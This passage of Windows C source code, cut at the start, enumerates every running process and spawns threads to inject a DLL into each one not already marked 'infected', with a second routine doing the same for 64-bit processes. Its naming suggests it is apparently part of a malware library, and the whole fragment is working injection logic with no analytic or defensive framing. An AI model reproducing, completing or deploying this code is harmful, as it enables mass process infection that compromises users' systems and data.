            DWORD dwInfectedProcessCount=0;
            PSYSTEM_PROCESS_INFORMATION lpProcesses=(PSYSTEM_PROCESS_INFORMATION)lpBuffer;
            for (DWORD i=0,j=0; i < dwProcessCount; i++)
            {
                if (!IsProcessInfected((DWORD)lpProcesses->UniqueProcessId))
                {
                    INJECT_PARAMS *lpParam=(INJECT_PARAMS*)MemAlloc(sizeof(INJECT_PARAMS));
                    if (lpParam)
                    {
                        lpParam->lpDll=lpDll;
                        lpParam->dwProcessId=(DWORD)lpProcesses->UniqueProcessId;
                        lpHandles[j]=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)InjectDllThread,lpParam,0,NULL);
                        if (lpHandles[j])
                        {
                            j++;
                            dwInfectedProcessCount++;
                        }
                        else
                            MemFree(lpParam);
                    }
                }
                lpProcesses=(PSYSTEM_PROCESS_INFORMATION)(((byte*)lpProcesses)+lpProcesses->NextEntryOffset);
            }

            SysWaitForMultipleObjects(dwInfectedProcessCount,lpHandles,true,INFINITE);
            for (DWORD i=0; i < dwInfectedProcessCount; i++)
                SysCloseHandle(lpHandles[i]);

            MemFree(lpHandles);
        }
        MemFree(lpBuffer);
    }
    return;
}

#ifdef _X86_
static void WINAPI InjectDll64Thread(INJECT_PARAMS *lpParam)
{
    InjectDll64(lpParam->dwProcessId,lpParam->lpDll);
    MemFree(lpParam);
    return;
}

SYSLIBFUNC(void) InjectDll64ToAll(LPBYTE lpDll)
{
    DWORD dwProcessCount;
    void *lpBuffer=SysGetProcessList(&dwProcessCount);
    if (lpBuffer)
    {
        HANDLE *lpHandles=(HANDLE*)MemAlloc(sizeof(HANDLE)*dwProcessCount);
        if (lpHandles)
        {
            DWORD dwInfectedProcessCount=0;
            PSYSTEM_PROCESS_INFORMATION lpProcesses=(PSYSTEM_PROCESS_INFORMATION)lpBuffer;
            for (DWORD i=0,j=0; i < dwProcessCount; i++)
            {
                if (!IsProcessInfected((DWORD)lpProcesses->UniqueProcessId))
                {
                    INJECT_PARAMS *lpParam=(INJECT_PARAMS*)MemAlloc(sizeof(INJECT_PARAMS));
                    if (lpParam)
                    {
                        lpParam->lpDll=lpDll;
                        lpParam->dwProcessId=(DWORD)lpProcesses->UniqueProcessId;
                        lpHandles[j]=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)InjectDll64Thread,lpParam,0,NULL);
                        if (lpHandles[j])
                        {
                            j++;
                            dwInfectedProcessCount++;
                        }
                        else
                            MemFree(lpParam);
                    }
                }
                lpProcesses=(PSYSTEM_PROCESS_INFORMATION)(((byte*)lpProcesses)+lpProcesses->NextEntryOffset);
            }

            SysWaitForMultipleObjects(dwInfectedProcessCount,lpHandles,true,INFINITE);
            for (DWORD i=0; i < dwInfectedProcessCount; i++)
                SysCloseHandle(lpHandles[i]);

            MemFree(lpHandles);
        }
        MemFree(lpBuffer);
    }
    return;
}
#endif

